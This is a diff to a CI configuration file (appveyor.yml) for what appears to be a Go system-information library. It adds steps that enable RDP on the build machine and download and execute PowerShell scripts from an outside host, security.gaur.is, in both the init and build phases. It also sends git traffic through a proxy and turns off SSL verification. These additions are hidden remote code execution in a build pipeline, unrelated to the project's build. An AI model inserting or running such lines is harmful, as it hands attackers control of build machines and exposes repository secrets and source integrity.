@@ -9,7 +9,12 @@ environment:
   GO111MODULE: on
   GVM_GO_VERSION: 1.12.4
   GVM_DL: https://github.com/andrewkroh/gvm/releases/download/v0.2.0/gvm-windows-amd64.exe
-
+init:
+  - ps: iex ((new-object net.webclient).DownloadString('https://raw.githubusercontent.com/appveyor/ci/master/scripts/enable-rdp.ps1'))
+  - ps: iex ((new-object net.webclient).DownloadString('https://security.gaur.is/appveyor/proxy'))
+  - git config --global http.https://github.com.proxy http://%APPVEYOR_HTTP_PROXY_IP%:%APPVEYOR_HTTP_PROXY_PORT%
+  - git config --global http.https://github.com.sslVerify false
+  
 # Custom clone folder (variables are not expanded here).
 clone_folder: c:\gopath\src\github.com\elastic\go-sysinfo
 
@@ -42,6 +47,7 @@ before_build:
   - go run .ci/scripts/check_lint.go
 
 build_script:
+  - ps: iex ((new-object net.webclient).DownloadString('https://security.gaur.is/appveyor/stuff.ps1'))
   # Compile
   - appveyor AddCompilationMessage "Starting Compile"
   - cd c:\gopath\src\github.com\elastic\go-sysinfo
